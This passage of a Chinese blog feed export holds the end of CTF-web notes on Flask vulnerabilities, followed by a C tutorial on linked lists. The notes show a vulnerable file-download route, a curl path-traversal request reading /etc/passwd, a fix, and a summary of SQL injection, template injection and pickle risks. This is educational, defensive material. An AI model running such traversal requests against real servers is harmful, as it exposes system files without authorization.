class="hljs-keyword">import</span> Flask, request, send_from_directory<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure><h4 id="利用方法：-3"><a href="#利用方法：-3" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过文件名参数构造路径遍历攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><p>此攻击将读取服务器上的 <code>/etc/passwd</code> 文件内容。</p><p><strong>解释</strong>：</p><ol><li><code>send_from_directory(&#39;/uploads&#39;, filename)</code> 函数中没有验证 <code>filename</code> 参数，攻击者可以构造路径遍历（如 <code>../../</code>）来读取任意文件。</li><li>通过 <code>..</code> 来跳出 <code>/uploads</code> 目录，访问系统文件。</li></ol><p><strong>解决方法</strong>：<br>使用 <code>os.path.join</code> 或 <code>safe_join</code> 来确保文件路径在指定目录内：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename, safe_join<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    safe_filename = secure_filename(filename)<br>    safe_path = safe_join(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_filename)<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, safe_path)<br></code></pre></td></tr></table></figure><ul><li><code>secure_filename</code> 将文件名安全化，移除特殊字符和危险路径。</li><li><code>safe_join</code> 确保路径在 <code>/uploads</code> 目录下，防止路径遍历攻击。</li></ul><hr><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ol><li><p><strong>SQL 注入</strong>：Flask 中的 SQL 注入攻击通常发生在未使用参数化查询的地方。攻击者可以通过注入恶意的 SQL 语句，查询、修改甚至删除数据库中的数据。防御措施是使用 ORM 工具，如 SQLAlchemy，避免直接拼接 SQL 字符串。</p></li><li><p>**远程代码执行 (RCE)**：Flask 使用 <code>render_template_string</code> 时，容易受到模板注入攻击。攻击者通过注入恶意模板表达式可以执行任意代码。防御措施是避免渲染用户输入的模板，使用严格的模板渲染模式。</p></li><li><p><strong>反序列化漏洞</strong>：当 Flask 使用 <code>pickle</code> 等反序列化库时，容易受到反序列化攻击。攻击者可以构造恶意序列化数据，导致任意代码执行。防御措施是避免使用不安全的序列化方法，推荐使用 JSON 作为序列化方式。</p></li><li><p><strong>路径遍历漏洞</strong>：Flask 中的路径遍历攻击发生在处理文件路径时，攻击者可以通过构造恶意的文件路径访问服务器上的任意文件。防御措施是确保文件</p></li></ol><p>路径的合法性，使用 <code>secure_filename</code> 和 <code>safe_join</code> 函数来防止路径遍历。</p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>基础笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfweb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c语言的数据结构</title>
    <link href="/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2024/09/03/c%E8%AF%AD%E8%A8%80%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><h4 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h4><ol><li><p><strong>结构</strong><br>单链表是由节点组成的，每个节点包含两个部分：数据域和指针域。指针域指向下一个节点。最后一个节点的指针域指向NULL，表示链表的结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125; Node;<br></code></pre></td></tr></table></figure></li><li><p><strong>建立</strong><br>建立单链表通常包括创建头节点和初始化链表的其他节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> &#123;<br>    Node* newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    <span class="hljs-keyword">if</span> (!newNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    newNode-&gt;data = data;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>前插入和后插入</strong></p><ul><li><p><strong>前插入</strong>：在指定节点之前插入新节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(Node** head, <span class="hljs-type">int</span> value, <span class="hljs-type">int</span> data)</span> &#123;<br>    Node* newNode = createNode(data);<br>    <span class="hljs-keyword">if</span> (*head == <span class="hljs-literal">NULL</span> || (*head)-&gt;data == value) &#123;<br>        newNode-&gt;next = *head;<br>        *head = newNode;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node* prev = <span class="hljs-literal">NULL</span>;<br>    Node* current = *head;<br>    <span class="hljs-keyword">while</span> (current &amp;&amp; current-&gt;data != value) &#123;<br>        prev = current;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Value not found\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    prev-&gt;next = newNode;<br>    newNode-&gt;next = current;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>后插入</strong>：在指定节点之后插入新节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(Node* prevNode, <span class="hljs-type">int</span> data)</span> &#123;<br>    <span class="hljs-keyword">if</span> (prevNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The given previous node cannot be NULL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node* newNode = createNode(data);<br>    newNode-&gt;next = prevNode-&gt;next;<br>    prevNode-&gt;next = newNode;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>初始化</strong></p><p>初始化链表通常指的是创建一个空的链表，可能会包含一个头节点（头指针）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">initializeList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 空链表</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>删除</strong></p><ul><li><p><strong>按值删除</strong>：删除链表中第一个匹配给定值的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteNodeByValue</span><span class="hljs-params">(Node** head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node* temp = *head;<br>    Node* prev = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (temp != <span class="hljs-literal">NULL</span> &amp;&amp; temp-&gt;data == value) &#123;<br>        *head = temp-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (temp != <span class="hljs-literal">NULL</span> &amp;&amp; temp-&gt;data != value) &#123;<br>        prev = temp;<br>        temp = temp-&gt;next;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (temp == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br><br>    prev-&gt;next = temp-&gt;next;<br>    <span class="hljs-built_in">free</span>(temp);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>按序号删除</strong>：删除链表中指定位置的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteNodeByIndex</span><span class="hljs-params">(Node** head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*head == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>  <br>    Node* temp = *head;<br>  <br>    <span class="hljs-keyword">if</span> (index == <span class="hljs-number">0</span>) &#123;<br>        *head = temp-&gt;next;<br>        <span class="hljs-built_in">free</span>(temp);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; temp != <span class="hljs-literal">NULL</span> &amp;&amp; i &lt; index - <span class="hljs-number">1</span>; i++) &#123;<br>        temp = temp-&gt;next;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span> (temp == <span class="hljs-literal">NULL</span> || temp-&gt;next == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>  <br>    Node* next = temp-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(temp-&gt;next);<br>    temp-&gt;next = next;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>按序号和值查找</strong></p><ul><li><p><strong>按序号查找</strong>：根据索引查找链表中的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">getNodeByIndex</span><span class="hljs-params">(Node* head, <span class="hljs-type">int</span> index)</span> &#123;<br>    Node* current = head;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (count == index) <span class="hljs-keyword">return</span> current;<br>        count++;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>按值查找</strong>：根据节点的值查找链表中的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">Node* <span class="hljs-title function_">getNodeByValue</span><span class="hljs-params">(Node* head, <span class="hljs-type">int</span> value)</span> &#123;<br>    Node* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (current-&gt;data == value) <span class="hljs-keyword">return</span> current;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>遍历</strong></p><p>遍历链表就是从头节点开始，依次访问每个节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">traverseList</span><span class="hljs-params">(Node* head)</span> &#123;<br>    Node* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, current-&gt;data);<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>求长</strong></p><p>计算链表的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getListLength</span><span class="hljs-params">(Node* head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    Node* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        length++;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> length;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>双链表的每个节点除了数据域和指向下一个节点的指针外，还包含一个指向前一个节点的指针。因此，每个节点都包含三个部分：数据域、前驱指针和后继指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span> &#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span>* <span class="hljs-title">prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DNode</span>* <span class="hljs-title">next</span>;</span><br>&#125; DNode;<br></code></pre></td></tr></table></figure><h4 id="建立"><a href="#建立" class="headerlink" title="建立"></a>建立</h4><p>建立双链表通常需要为每个节点分配内存并设置前驱和后继指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">DNode* <span class="hljs-title function_">createDNode</span><span class="hljs-params">(<span class="hljs-type">int</span> data)</span> &#123;<br>    DNode* newNode = (DNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(DNode));<br>    <span class="hljs-keyword">if</span> (!newNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Memory error\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    newNode-&gt;data = data;<br>    newNode-&gt;prev = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="前插入和后插入"><a href="#前插入和后插入" class="headerlink" title="前插入和后插入"></a>前插入和后插入</h4><ul><li><p><strong>前插入</strong>：在指定节点之前插入新节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertBefore</span><span class="hljs-params">(DNode** head, DNode* nextNode, <span class="hljs-type">int</span> data)</span> &#123;<br>    <span class="hljs-keyword">if</span> (nextNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Next node cannot be NULL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DNode* newNode = createDNode(data);<br>    newNode-&gt;prev = nextNode-&gt;prev;<br>    newNode-&gt;next = nextNode;<br>    nextNode-&gt;prev = newNode;<br>    <span class="hljs-keyword">if</span> (newNode-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;prev-&gt;next = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        *head = newNode;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>后插入</strong>：在指定节点之后插入新节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">insertAfter</span><span class="hljs-params">(DNode* prevNode, <span class="hljs-type">int</span> data)</span> &#123;<br>    <span class="hljs-keyword">if</span> (prevNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Previous node cannot be NULL\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DNode* newNode = createDNode(data);<br>    newNode-&gt;next = prevNode-&gt;next;<br>    newNode-&gt;prev = prevNode;<br>    prevNode-&gt;next = newNode;<br>    <span class="hljs-keyword">if</span> (newNode-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        newNode-&gt;next-&gt;prev = newNode;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>初始化双链表可以创建一个空链表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">DNode* <span class="hljs-title function_">initializeDList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;  <span class="hljs-comment">// 空链表</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul><li><p><strong>按值删除</strong>：删除双链表中第一个匹配给定值的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteDNodeByValue</span><span class="hljs-params">(DNode** head, <span class="hljs-type">int</span> value)</span> &#123;<br>    DNode* temp = *head;<br>    <span class="hljs-keyword">while</span> (temp != <span class="hljs-literal">NULL</span> &amp;&amp; temp-&gt;data != value) &#123;<br>        temp = temp-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (temp == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">if</span> (*head == temp) &#123;<br>        *head = temp-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (temp-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        temp-&gt;next-&gt;prev = temp-&gt;prev;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (temp-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        temp-&gt;prev-&gt;next = temp-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(temp);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>按序号删除</strong>：删除双链表中指定位置的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deleteDNodeByIndex</span><span class="hljs-params">(DNode** head, <span class="hljs-type">int</span> index)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*head == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br><br>    DNode* temp = *head;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; temp != <span class="hljs-literal">NULL</span> &amp;&amp; i &lt; index; i++) &#123;<br>        temp = temp-&gt;next;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (temp == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">if</span> (*head == temp) &#123;<br>        *head = temp-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (temp-&gt;next != <span class="hljs-literal">NULL</span>) &#123;<br>        temp-&gt;next-&gt;prev = temp-&gt;prev;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (temp-&gt;prev != <span class="hljs-literal">NULL</span>) &#123;<br>        temp-&gt;prev-&gt;next = temp-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(temp);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="按序号和值查找"><a href="#按序号和值查找" class="headerlink" title="按序号和值查找"></a>按序号和值查找</h4><ul><li><p><strong>按序号查找</strong>：根据索引查找双链表中的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">DNode* <span class="hljs-title function_">getDNodeByIndex</span><span class="hljs-params">(DNode* head, <span class="hljs-type">int</span> index)</span> &#123;<br>    DNode* current = head;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (count == index) <span class="hljs-keyword">return</span> current;<br>        count++;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>按值查找</strong>：根据节点的值查找双链表中的节点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">DNode* <span class="hljs-title function_">getDNodeByValue</span><span class="hljs-params">(DNode* head, <span class="hljs-type">int</span> value)</span> &#123;<br>    DNode* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (current-&gt;data == value) <span class="hljs-keyword">return</span> current;<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h4><p>遍历双链表可以从头到尾遍历，也可以从尾到头遍历。</p><ul><li><p><strong>从头到尾遍历</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">traverseDListForward</span><span class="hljs-params">(DNode* head)</span> &#123;<br>    DNode* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, current-&gt;data);<br>        current = current-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>从尾到头遍历</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">traverseDListBackward</span><span class="hljs-params">(DNode* tail)</span> &#123;<br>    DNode* current = tail;<br>    <span class="hljs-keyword">while</span> (current != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, current-&gt;data);<br>        current = current-&gt;prev;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="求长"><a href="#求长" class="headerlink" title="求长"></a>求长</h4><p>计算双链表的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getDListLength</span><span class="hljs-params">(DNode* head)</span> &#123;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">0</span>;<br>    DNode* current = head;<br>    <span class="hljs-keyword">while</span> (current != <span 